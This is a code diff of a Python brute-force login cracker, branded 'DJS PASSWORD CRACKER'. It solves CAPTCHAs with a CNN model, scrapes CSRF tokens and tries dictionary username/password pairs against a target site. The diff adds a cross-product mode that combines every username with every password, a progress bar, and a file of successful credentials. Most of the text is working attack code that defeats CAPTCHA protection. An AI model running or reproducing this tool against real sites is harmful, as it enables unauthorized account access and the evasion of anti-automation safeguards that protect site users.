@@ -2,6 +2,7 @@ from optparse import OptionParser
 import os
 import requests
 from bs4 import BeautifulSoup
+from tqdm import tqdm
 from app.util.captcha_break import predict_image
 
 
@@ -14,7 +15,6 @@ def check_successfully(content):
 
 
 def get_captcha(image_name):
-    # code = input("code: ")
     code = predict_image(image_name, model_path="../model/cnn.h5")
     return code
 
@@ -22,6 +22,7 @@ def get_captcha(image_name):
 def crack(site, username, password):
     s = requests.Session()
     page_content = s.get(site).content  # 获得 Session
+
     soup = BeautifulSoup(page_content, 'lxml')
     csrf = soup.body.find_all(attrs={'id': 'csrf_token'})[0].attrs['value']
 
@@ -47,13 +48,20 @@ if __name__ == '__main__':
     parser.add_option('-d', '--dict', dest="data_dict", type="string")
     parser.add_option('-u', '--user', dest="user_dict", type="string")
     parser.add_option('-p', '--pass', dest="pass_dict", type="string")
+    parser.add_option('-o', '--out', dest="out_file", type="string")
+    parser.add_option('-c', action="store_true", dest="cross")
 
     options, args = parser.parse_args()
 
     site = options.site
     if site is None:
-        print("You should specify target host by -h or --host")
-        exit(-1)
+        site = 'http://127.0.0.1:5000/'
+    if site[-1] != '/':
+        site += '/'
+
+    out_file = options.out_file
+    if out_file is None:
+        out_file = './default_out'
 
     data_dict_path = options.data_dict
 
@@ -66,7 +74,7 @@ if __name__ == '__main__':
         user_dict_path = options.user_dict
         pass_dict_path = options.pass_dict
         if user_dict_path is None or pass_dict_path is None:
-            print("You should specify target dict by -d or --dict\nOr you can specify user by -u and password by -p")
+            print("You should specify target dict by -d or --dict\nOr you can specify user by -u with password by -p")
             exit(-1)
         if not os.path.exists(user_dict_path) or not os.path.exists(pass_dict_path):
             print("File %s or %s not found." % (data_dict_path, pass_dict_path))
@@ -91,13 +99,50 @@ if __name__ == '__main__':
                     username_list.append(username)
                     password_list.append(password)
 
-    # 开始爆破
-    for index in range(len(username_list)):
-        username = username_list[index]
-        password = password_list[index]
-        if len(username) <= 1 or len(password) <= 1:
-            continue
-        result, _, _ = crack(site, username, password)
-        if result:
-            print("Find correct username and password: %s - %s" % (username, password))
+    print('''
+  ____        _      ____     
+ |  _"\    U |"| u  / __"| u  
+/| | | |  _ \| |/  <\___ \/   
+U| |_| |\| |_| |_,-.u___) |   
+ |____/ u \___/-(_/ |____/>>  
+  |||_     _//       )(  (__) 
+ (__)_)   (__)      (__)      
+    ''')
+    print('WELCOME TO DJS PASSWORD CRACKER!')
+    print('Your target site is \033[1;34;40m%s\033[0m' % site)
+    print('Now the process of crack will begin, please wait for a minute...')
+    print('NOTE: You can stop this process any time you want, and the results will write in \033[1;32;40m%s\033[0m\n\n' % out_file)
+    out = open(out_file, 'w')
+    match_count = 0
+    if options.cross:
+        total_count = len(username_list) * len(password_list)
+        pbar = tqdm(total=total_count)
+        for username in username_list:
+            if len(username) <= 1:
+                pbar.update(len(password_list))
+                continue
+            for password in password_list:
+                pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
+                pbar.update(1)
+                if len(password) <= 1:
+                    continue
+                result, _, _ = crack(site, username, password)
+                if result:
+                    match_count += 1
+                    out.write(username + ' --- ' + password + '\n')
+    else:
+        total_count = len(username_list)
+        pbar = tqdm(total=total_count)
+        for index in range(len(username_list)):
+            pbar.update(1)
+            username = username_list[index]
+            password = password_list[index]
+            if len(username) <= 1 or len(password) <= 1:
+                continue
+            result, _, _ = crack(site, username, password)
+            if result:
+                match_count += 1
+                out.write(username + ' --- ' + password + '\n')
+                print('\rNow find %d username and password pair(s)' % match_count)
 
+    out.close()
